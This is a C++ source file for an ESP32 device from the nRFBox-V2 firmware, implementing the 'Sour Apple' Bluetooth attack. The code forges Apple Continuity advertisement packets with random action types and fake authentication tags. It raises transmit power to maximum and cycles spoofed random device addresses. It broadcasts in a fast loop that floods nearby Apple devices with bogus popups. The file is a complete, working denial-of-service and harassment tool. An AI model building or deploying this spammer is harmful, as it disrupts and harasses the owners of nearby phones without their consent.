/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   Modified By
   https://github.com/HackerNowful/nRFBox-V2
   ________________________________________ */

#include <Arduino.h>
#include "sourapple.h"
#include "config.h"
#include "neopixel.h"
std::string device_uuid = "00003082-0000-1000-9000-00805f9b34fb";

BLEAdvertising *pAdvertising;
uint8_t packet[17];

#define MAX_LINES 8
String lines[MAX_LINES];
int currentLine = 0;
int lineNumber = 1;

uint32_t delayMilliseconds = 1000;

void updatedisplay() {
  u8g2.clearBuffer();

  for (int i = 0; i < MAX_LINES; i++) {
    u8g2.setCursor(0, (i + 1) * 12);
    u8g2.print(lines[i]);
  }
  setNeoPixelColour("green");
  u8g2.sendBuffer();
  pAdvertising->stop();
}

void addLineToDisplay(String newLine) {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    lines[i] = lines[i + 1];
  }
  lines[MAX_LINES - 1] = newLine;

  updatedisplay();
}

void displayAdvertisementData() {
  String lineStr = String(lineNumber) + ": ";
  lineNumber++;
  // Convert the advertisement data to a readable string format
  //String dataStr = "Type: 0x";
  String dataStr = "0x";
  dataStr += String(packet[1], HEX);
  //dataStr += ", CompID: 0x";
  dataStr += ",0x";
  dataStr += String(packet[2], HEX);
  dataStr += String(packet[3], HEX);
  //dataStr += ", ActType: 0x";
  dataStr += ",0x";
  dataStr += String(packet[7], HEX);

  addLineToDisplay(lineStr + dataStr);

}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  esp_fill_random(&packet[i], 3); // Authentication Tag
  i += 3;
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9); //This should increase transmitting power to 9dBm
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9); //Not sure if this works with NimBLE
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);

  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);


}

void sourappleLoop() {
  while (true) {
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
      if (i == 0) {
        dummy_addr[i] |= 0xF0;
      }
    }
    BLEAdvertisementData oAdvertisementData = getOAdvertisementData();

    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
    pAdvertising->addServiceUUID(device_uuid);
    pAdvertising->setAdvertisementData(oAdvertisementData);

    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setMinPreferred(0x20);
    pAdvertising->setMaxPreferred(0x20);

    pAdvertising->start();

    delay(40);
    displayAdvertisementData();

    if (digitalRead(BUTTON_BACK_PIN) == LOW) {
      setNeoPixelColour("off");
      current_screen = 0;
      drawMenu();
      break;
    }
  }
}
